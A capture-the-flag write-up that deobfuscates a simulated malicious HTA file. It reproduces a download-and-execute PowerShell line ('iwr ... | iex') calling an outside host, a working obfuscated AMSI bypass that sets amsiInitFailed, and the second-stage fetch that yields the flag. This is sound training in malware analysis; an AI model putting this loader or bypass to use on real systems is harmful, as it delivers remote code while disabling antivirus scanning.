**Challenge Title:** Company Discount (Forensics / Deobfuscation)


---

### Challenge Overview

The challenge provides an HTML Application (`.hta`) file simulating a malicious script. Analysis of the file reveals multi-stage PowerShell execution, AMSI (Antimalware Scan Interface) bypass techniques, and obfuscation designed to hide the final flag.

---

### Step-by-Step Analysis

#### 1. Initial Inspection (HTA File)

Extracting the embedded JScript code from the initial `.hta` file reveals a command executed via `WScript.Shell`:

```javascript
var c = "powershell.exe -w minimized /c 'iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b | iex'";
new ActiveXObject('WScript.Shell').Run(c);

```

* **Observation:** The script launches a minimized PowerShell process, fetches a remote script using `Invoke-WebRequest` (`iwr`), and pipes it directly into `Invoke-Expression` (`iex`).

---

#### 2. Stage 1 Retrieval & AMSI Bypass Deobfuscation

Downloading the script from the first endpoint yields the contents of `payload.ps1`:

```powershell
$international = [mANaGemeNT.AUTomATION.psREFeREnCe]
$cash = $international."aSSeMbLy"
$flow = $cash.gEttYpe("SY"+"s"+"teM."+"maNAg"+"E"+"MeNt."+"a"+"UToma"+"t"+"iON.a"+"MSI"+"UTIL"+"s" , $false , $true )
$district = " nonpuBLIc , "
$actuary = "se "
$expense = " "
$assemble = "ca"
$group = "TatiC , "
$amass = " iGnoRE"
$gather = "S"
$corporate = " "
$senior = "{0}{6}{4}{5}{3}{1}{2}{7}" -f $district,$actuary,$expense,$assemble,$group,$amass,$gather,$corporate
$lead = $flow."GeTfIELd"("a"+"MsiIN"+"iTfAi"+"le"+"D" , $senior)
$lead.setVaLUE($null,$true)
$follower = iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7

```

* **Analysis:**
* String concatenation and format string manipulation (`-f`) assemble the string `"System.Management.Automation.AmsiUtils"` and Reflection flags (`NonPublic, Static, IgnoreCase`).
* The script locates the internal field `amsiInitFailed` and sets its value to `$true`. This effectively disables AMSI scanning for subsequent commands in the PowerShell session.
* After bypassing AMSI, it issues a request to a second endpoint: `[https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7](https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7)`.



---

#### 3. Stage 2 Retrieval & Flag Extraction

Fetching the secondary endpoint reveals the final payload:

```bash
curl -k -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  'https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/17d995a0-46e2-4c06-95d0-6165771cd1b7' -o payload2.ps1

```

Inspecting `payload2.ps1` exposes the flag directly:

```text
brunner{wh00ps_l3ts_1gn0r3_th1s_4nd_h0p3_1T_d03snt_n0t1c3}

```